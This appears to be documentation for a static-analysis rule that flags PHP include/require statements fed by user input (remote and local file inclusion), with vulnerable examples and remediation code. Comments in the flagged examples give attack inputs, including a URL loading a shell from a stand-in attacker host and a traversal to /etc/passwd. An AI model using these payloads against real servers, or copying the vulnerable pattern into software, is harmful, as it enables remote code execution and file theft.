---
title: "VNX-98 – PHP Remote File Inclusion"
description: "Detect PHP include/require statements that use user-controlled superglobal variables as the file path, enabling attackers to load and execute arbitrary remote code."
---

## Overview

This rule flags PHP `include`, `include_once`, `require`, and `require_once` statements that directly use superglobal values (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`) as the file path argument. PHP Remote File Inclusion (RFI) allows an attacker to supply a URL (e.g. `http://attacker.com/shell.php`) as the file path, causing the server to fetch and execute arbitrary PHP code from that remote URL — if `allow_url_include` is enabled. Even when RFI is not possible, the same pattern enables Local File Inclusion (LFI), which allows reading sensitive files and, in some configurations, code execution via log-file poisoning or PHP filter chains. This maps to [CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')](https://cwe.mitre.org/data/definitions/98.html).

**Severity:** Critical | **CWE:** [CWE-98 – PHP Remote File Inclusion](https://cwe.mitre.org/data/definitions/98.html)

## Why This Matters

PHP RFI was one of the most prevalent attack classes in the mid-2000s and remains present in legacy codebases and poorly maintained applications today. Even with `allow_url_include = Off` in `php.ini`, the equivalent LFI is still exploitable: attackers read `/etc/passwd`, `/proc/self/environ`, Apache access logs (which can be poisoned with PHP code via the `User-Agent` header), or use `php://filter` chains to achieve code execution. A single `include($_GET['page'])` can compromise the entire server. The second finding category — `include($variable)` without a direct superglobal — is reported at lower severity but is still worth auditing because the variable may receive its value from user input indirectly.

## What Gets Flagged

```php
<?php
// FLAGGED: direct superglobal in include
$page = $_GET['page'];
include($page);                      // attacker: ?page=http://evil.com/shell.php

// FLAGGED: inline superglobal
include($_GET['module'] . '.php');   // attacker: ?module=../../../etc/passwd%00

// FLAGGED: require with POST data
require($_POST['lib']);

// FLAGGED: require_once with REQUEST
require_once($_REQUEST['template']);
```

```php
<?php
// FLAGGED (warning): variable include — may be user-tainted
$module = getModule();  // trace: does getModule() use $_GET?
include($module);
```

## Remediation

1. **Use a hardcoded allowlist and never allow user input to determine the file path directly.**

```php
<?php
// SAFE: strict allowlist of permitted page names
$allowed_pages = ['home', 'about', 'contact', 'faq'];

$page = $_GET['page'] ?? 'home';

// Validate against the allowlist before any file operation
if (!in_array($page, $allowed_pages, true)) {
    http_response_code(404);
    include(__DIR__ . '/pages/404.php');
    exit;
}

// Include using a hardcoded base path with no user-supplied separators
include __DIR__ . '/pages/' . $page . '.php';
```

2. **Validate and sanitise if an allowlist is not possible** (not recommended, but better than nothing).

```php
<?php
// BETTER (but not ideal): strip dangerous characters and validate extension
$page = basename($_GET['page'] ?? '');
$page = preg_replace('/[^a-zA-Z0-9_\-]/', '', $page);   // only alphanum + _ -

if (empty($page)) {
    $page = 'home';
}

$path = __DIR__ . '/pages/' . $page . '.php';

// Ensure the resolved path is within the expected directory (defence in depth)
$realpath = realpath($path);
if ($realpath === false || strpos($realpath, realpath(__DIR__ . '/pages/')) !== 0) {
    http_response_code(400);
    exit('Invalid page');
}

include $realpath;
```

3. **Disable `allow_url_include` and `allow_url_fopen` in `php.ini`.** These should always be `Off` in production; they provide no legitimate use case that cannot be served by proper HTTP client libraries.

```ini
; php.ini — disable remote file inclusion at the PHP level
allow_url_include = Off
allow_url_fopen   = Off
```

4. **Use a front controller pattern.** Route all requests through a single entry point that maps URL parameters to specific controller classes — never to raw file paths. Frameworks like Laravel, Symfony, and Slim handle this correctly by default.

## References

- [CWE-98: PHP Remote File Inclusion](https://cwe.mitre.org/data/definitions/98.html)
- [OWASP File Inclusion](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [CAPEC-253: Remote Code Inclusion](https://capec.mitre.org/data/definitions/253.html)
- [MITRE ATT&CK T1059.004 – Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
